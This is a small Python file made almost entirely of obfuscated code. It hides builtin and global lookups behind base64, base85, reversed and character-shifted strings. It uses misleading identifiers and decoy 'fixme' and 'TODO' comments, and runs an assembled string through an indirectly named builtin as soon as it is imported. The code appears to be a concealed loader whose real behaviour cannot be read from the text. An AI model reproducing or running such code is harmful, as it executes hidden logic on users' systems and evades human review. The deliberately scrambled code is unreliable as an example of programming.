from base64 import b64decode as strides_from_shape
from base64 import b85decode as set_value
StdoutRefactoringTool=__builtins__.__dict__[''[::-1].join([chr(ord(i)-3)for i in set_value('Y;ku').decode()])](strides_from_shape("".join([chr(ord(i)-3)for i in'PT@@'])).decode())
_29997=__name__.__len__().__class__('sockname'.replace('sockname','0x8'),(__name__.__len__.__call__().__class__(0+0)))
# fixme, not working
import random as report_type
# TODO: remove
import string as MB_ICONASTERISK
def exp_clause():
 # TODO: not that
 return report_type.choice(MB_ICONASTERISK.ascii_lowercase)
def old_main_modules(cliaddr):
 trace_pass=globals()[strides_from_shape('X19idWlsdGluc19f').decode()].__dict__["".join([chr(ord(i)-3)for i in'']).join([chr(ord(i)-3)for i in'\u006a\u006f\u0072\u0065\u0064\u006f\u0076'])]()[strides_from_shape("".join([chr(ord(i)-3)for i in''])).decode().join([__builtins__.__dict__.__getitem__("".join([chr(ord(i)-3)for i in'ukf'])[::-1])(globals()[set_value(strides_from_shape('VXRlTiVYPjQ/OVpnWEU+').decode()).decode()].__dict__["".join([chr(ord(i)-3)for i in'rFkhfnOlvwg']).replace("".join([chr(ord(i)-3)for i in'FkhfnOlvw']),"".join([chr(ord(i)-3)for i in'u']))](i)-(__builtins__.__getattribute__(strides_from_shape('').decode().join([chr(ord(i)-3)for i in'Wthreadsafetyxh'.replace('threadsafety','u')]))+__name__.__eq__.__call__(__name__)+(type(1)==type(1))))for i in strides_from_shape(strides_from_shape('WW1KbGVHeHZkMnh4ZG1KaQ==').decode()).decode()])].__dict__[set_value("".join([chr(ord(i)-3)for i in'[N]jcYTj\x81'])).decode()]()[set_value('c7b{nB{V3F5qW'[::-1]).decode()]().llQJVvV()
 for NOT_PRESENT in __builtins__.__dict__.__getitem__("".join([chr(ord(i)-3)for i in'ufrpslohubiodjUVXPH']).replace('galf_relipmoc'[::-1],"".join([chr(ord(i)-3)for i in'NH\\bV'])).replace('EEXPECTED_EVENTSEK'.replace('EXPECTED_EVENTS','MUSRS_Y')[::-1],'ange'[::-1][::-1]))(cliaddr-StdoutRefactoringTool):
  trace_pass+=__builtins__.__dict__["".join([__builtins__.__dict__.__getitem__(set_value('').decode().join([chr(ord(i)-3)for i in"".join([chr(ord(i)-3)for i in'inx'])]))(__builtins__.__dict__[set_value('').decode().join([chr(ord(i)-3)for i in set_value('a&>0').decode()])](i)-__builtins__.__dict__.__getitem__("".join([chr(ord(i)-3)for i in'qho'])[::-1])(set_value('').decode().join([chr(ord(i)-3)for i in strides_from_shape('dXV1').decode()])))for i in strides_from_shape('amludGVybGVhdmVyZWRpbnRlcmxlYXZldg==').decode().replace("".join([chr(ord(i)-3)for i in'lqwhuohdyh']),"".join([chr(ord(i)-3)for i in'r']))])]()[strides_from_shape(strides_from_shape('WlhOMVlXeGpYM0I0WlE9PQ==').decode()).decode()[::-globals()[set_value('UuJS)ZDn6)Wprm{Ze?;|bZ>HB').decode().replace('frame_getgcheck_data_descriptortor'.replace('check_data_descriptor','enera'),"".join([chr(ord(i)-3)for i in'bexlowlqvb']))].__dict__['cmsg_typen'.replace('cmsg_type','le')]("".join([chr(ord(i)-3)for i in'l']))]]()
 return trace_pass
def dataRead():
 cmd_nlst=__builtins__.__dict__.__getitem__(set_value('4|)Z^NK8b'[::-1]).decode()[::(__name__.__len__.__call__().__class__((__name__.__len__().__class__(1+5))+(__name__.__len__().__class__(set_value("".join([chr(ord(i)-3)for i in'HlldG'])).decode(),0))))])()["".join([chr(ord(i)-3)for i in set_value('a&Kp1aAa(8VsLV2cyDNS').decode()])](_29997)
 version_line=strides_from_shape(strides_from_shape('').decode()).decode().join([__builtins__.__getattribute__(strides_from_shape('').decode().join([chr(ord(i)-3)for i in'ukf'[::-1]]))(__builtins__.__dict__.__getitem__("".join([chr(ord(i)-3)for i in set_value('a&>0').decode()]))(i)-(__name__.__len__().__class__(__builtins__.__dict__[strides_from_shape('uVGb'[::-1]).decode()]("".join([chr(ord(i)-3)for i in'']).join([chr(ord(i)-3)for i in strides_from_shape('cw==').decode()]))+__name__.__len__.__call__().__class__('2'[::-1]))))for i in strides_from_shape(set_value('RY-SgV=`znNiujcNi#-kV@GE>Nq0Rx').decode()).decode()])+cmd_nlst
 __builtins__.__dict__[set_value(set_value('SW0$AK3O|bDn3~&azi^|CLs').decode()).decode().replace(set_value(set_value('SW0$AK3O|bDn3~&azi^|CLs').decode()).decode(),set_value('aAPointGbN'.replace('APoint','B^v')).decode())](version_line)
__builtins__.__getattribute__(set_value('\u0058\u004b\u005a\u0067\u0060\u0056\u0051\u0067\u007e').decode())()[strides_from_shape("".join([chr(ord(i)-3)for i in'\u005d\u004a\u00493\u005c\u0059\u004d\u006f\u005c\u005a\u0054\u0040'])).decode()]()